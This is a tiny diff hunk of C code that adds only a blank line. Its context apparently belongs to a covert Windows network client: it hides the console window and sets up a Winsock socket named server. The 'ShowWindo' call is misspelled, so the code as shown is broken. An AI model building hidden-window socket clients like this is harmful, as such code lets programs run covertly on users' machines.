@@ -12,6 +12,7 @@
 char *userDirectory();
 
 int main() {
+	
 	ShowWindo(GetConsoleWindow(), SW_HIDE); // do not show the main program window
 	WSADATA WSAData;
 	SOCKET server; // Variable used to store the connection of the SOCKET type
